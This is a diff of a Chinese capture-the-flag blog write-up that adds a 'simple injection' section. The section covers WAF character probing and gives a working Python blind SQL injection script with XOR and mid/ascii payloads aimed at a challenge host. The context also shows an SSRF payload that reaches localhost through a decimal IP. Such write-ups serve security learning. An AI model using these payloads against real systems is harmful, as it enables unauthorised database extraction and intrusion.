@@ -133,7 +133,15 @@
 <meta property="og:image" content="https://www.ebounce.cn/Moctf-wp小结/no2.png">
 <meta property="og:image" content="https://www.ebounce.cn/Moctf-wp小结/ip.png">
 <meta property="og:image" content="https://www.ebounce.cn/Moctf-wp小结/f.png">
-<meta property="og:updated_time" content="2019-07-09T07:48:38.779Z">
+<meta property="og:image" content="https://www.ebounce.cn/Moctf-wp小结/t1.png">
+<meta property="og:image" content="https://www.ebounce.cn/Moctf-wp小结/t3.png">
+<meta property="og:image" content="https://www.ebounce.cn/Moctf-wp小结/waf.png">
+<meta property="og:image" content="https://www.ebounce.cn/Moctf-wp小结/char.png">
+<meta property="og:image" content="https://www.ebounce.cn/Moctf-wp小结/blank.png">
+<meta property="og:image" content="https://www.ebounce.cn/Moctf-wp小结/tn.png">
+<meta property="og:image" content="https://www.ebounce.cn/Moctf-wp小结/cn.png">
+<meta property="og:image" content="https://www.ebounce.cn/Moctf-wp小结/ff.png">
+<meta property="og:updated_time" content="2019-07-11T08:31:46.273Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Moctf-wp小结">
 <meta name="twitter:description" content="最近几天做了Moctf上的几道题,还是比较涨姿势的,这里做个记录小小的记录. 死亡退出  源码当中预定义了一个字符串c为 1&amp;lt;?php exit;?&amp;gt;  有关思考方向 而后面的代码主要就是接收POST传进来file值,并作判断,我们是否传入了file的值,并且如果我们传入了file,则将tmp.php中的内容设置为空,或者直接创建一个tmp.php的文件,最后再将之前预定义的字符串C和">
@@ -380,7 +388,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-07-09 15:48:38" itemprop="dateModified" datetime="2019-07-09T15:48:38+08:00">2019-07-09</time>
+                <time title="修改时间：2019-07-11 16:31:46" itemprop="dateModified" datetime="2019-07-11T16:31:46+08:00">2019-07-11</time>
               </span>
             
           
@@ -414,7 +422,7 @@
               
                 <span class="post-meta-item-text">本文字数：</span>
               
-              <span title="本文字数">9.6k</span>
+              <span title="本文字数">12k</span>
             </span>
           
 
@@ -426,7 +434,7 @@
               
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
               
-              <span title="阅读时长">9 分钟</span>
+              <span title="阅读时长">11 分钟</span>
             </span>
           
 
@@ -585,7 +593,32 @@ payload1为:
 <p>经过测试发现这几个ip地址,只有十进制那个可以被识别,具体原理不太清楚,所以最后的payload为:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//www.moctf.com@2130706433/%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30</span></span><br></pre></td></tr></table></figure>
 
-<img src="/Moctf-wp小结/f.png"></',';','>
+<img src="/Moctf-wp小结/f.png">
+
+<h1>简单注入</h1>
+这大概是这个平台唯一一个还可以动手的300分的题吧,其余几个等再强一点,再来补吧,这道题点进去,就只有一个欢迎界面什么都没有,按照常规步骤,先看看F12有啥吧,这里提示我们使用id参数,进入url里面查询id=1返回了Hello,
+<img src="/Moctf-wp小结/t1.png">
+挨着挨着往后看,发现id=4已经没有数据了,但id=3有个小提示\
+<img src="/Moctf-wp小结/t3.png">
+这里告诉我们表名超过20个字符(天秀....)
+题目已经告诉我们这里是一个简单注入,我们首先需要搞清楚,是用什么方法闭合参数,这里先测试了一下利用and 1=1和and 1=2的回显来判断,然而似乎触发了waf
+<img src="/Moctf-wp小结/waf.png">
+我们用Burpsuite简单的用一个字典爆破一下,看看有哪些字符会触发waf,如下图:
+<img src="/Moctf-wp小结/char.png">
+我们注意到'or'和' '(空格)都没有,但'and'和'(',')'还可以使用,也通过爆破大致判断出来该参数注入类型为字符型,因为直接加入字符是不会返回false的空白界面,下面这两个字符分别返回了空白界面
+<img src="/Moctf-wp小结/blank.png">
+也就是说注入这两个字符报错了,其中一个字符还是单引号,基本肯定是单引号型的字符注入了,最后用and '1'='1来验证一下吧,空格可以用括号来进行替换.
+
+
+两者返回不同,可以判断是字符型的注入,由于无回显,是属于盲注,因此开始搞脚本.
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"></span><br><span class="line">string1=string.ascii_lowercase+string.digits+<span class="string">"+-*/=!@#$%^&amp;*()_|\][&#123;&#125;\'\",."</span></span><br><span class="line">num=len(string1)</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="comment">#payload1="1'and(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;0&#125;,1))='&#123;1&#125;"</span></span><br><span class="line"><span class="comment">#payload2="1'and(mid((select(group_concat(column_name))from(information_schema.columns)where(table_schema)=database()),&#123;0&#125;,1))='&#123;1&#125;"</span></span><br><span class="line"><span class="comment">#payload3="1'and(mid((select(d0_you_als0_l1ke_very_long_column_name)from(do_y0u_l1ke_long_t4ble_name)),&#123;0&#125;,1))='&#123;1&#125;"//会出错因为flag有几个是大写的</span></span><br><span class="line">url=<span class="string">"http://119.23.73.3:5004/?id="</span></span><br><span class="line"><span class="string">'''for i in range(50):</span></span><br><span class="line"><span class="string">    for x in range(num):</span></span><br><span class="line"><span class="string">        key=url+payload3.format(str(i),string1[x])</span></span><br><span class="line"><span class="string">        html=r.get(key)</span></span><br><span class="line"><span class="string">        if "Hello" in html.text:</span></span><br><span class="line"><span class="string">            print("[*]Get one char!====&gt;",end=" ")</span></span><br><span class="line"><span class="string">            flag+=string1[x]</span></span><br><span class="line"><span class="string">            print(flag)'''</span></span><br><span class="line">payload4=<span class="string">"1'^(ascii(mid((select(d0_you_als0_l1ke_very_long_column_name)from(do_y0u_l1ke_long_t4ble_name)),&#123;0&#125;,1))=&#123;1&#125;)^'1"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">55</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">130</span>):</span><br><span class="line">        key = url + payload4.format(str(i), str(x))</span><br><span class="line">        html=r.get(key)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            print(<span class="string">"[*]Get one char!====&gt;"</span>, end=<span class="string">" "</span>)</span><br><span class="line">            flag += chr(x)</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>前面那坨是跑列名表名时候用的脚本,不知道为什么总会多出两个脚本,而且用前面的脚本跑出来的flag不对,因为第一遍跑的时候,原本是加入了大写字符的,但是跑的时候大写小写均判断为正确,所以去掉了大写字符,但是最后flag又是包含大写字符….,因此前面那坨不适合用来跑flag.而且最后用异或的方法跑的时候,总会多出来的两个字符也消失了,我…………<br>大概跑出来就是这样的</p>
+<img src="/Moctf-wp小结/tn.png">
+<img src="/Moctf-wp小结/cn.png">
+<img src="/Moctf-wp小结/ff.png">
+<p>最后两道题,等再强一点再补吧</p>
+</',';','>
       
     </div>
 
@@ -835,7 +868,7 @@ payload1为:
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">死亡退出</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.1.</span> <span class="nav-text">有关思考方向</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">2.</span> <span class="nav-text">有关利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">2.1.</span> <span class="nav-text">番外:那么字符操作呢?</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">3.</span> <span class="nav-text">火眼金睛</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">4.</span> <span class="nav-text">Unset</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">5.</span> <span class="nav-text">PUBG</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">6.</span> <span class="nav-text">网站检测器</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">死亡退出</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.1.</span> <span class="nav-text">有关思考方向</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">2.</span> <span class="nav-text">有关利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">2.1.</span> <span class="nav-text">番外:那么字符操作呢?</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">3.</span> <span class="nav-text">火眼金睛</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">4.</span> <span class="nav-text">Unset</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">5.</span> <span class="nav-text">PUBG</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">6.</span> <span class="nav-text">网站检测器</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">7.</span> <span class="nav-text">简单注入</span></a></li></ol></div>
             
 
           </div>
@@ -868,7 +901,7 @@ payload1为:
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">33k</span>
+    <span title="站点总字数">35k</span>
   
 
   
@@ -877,7 +910,7 @@ payload1为:
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">30 分钟</span>
+    <span title="站点阅读时长">32 分钟</span>
   
 </div>
 
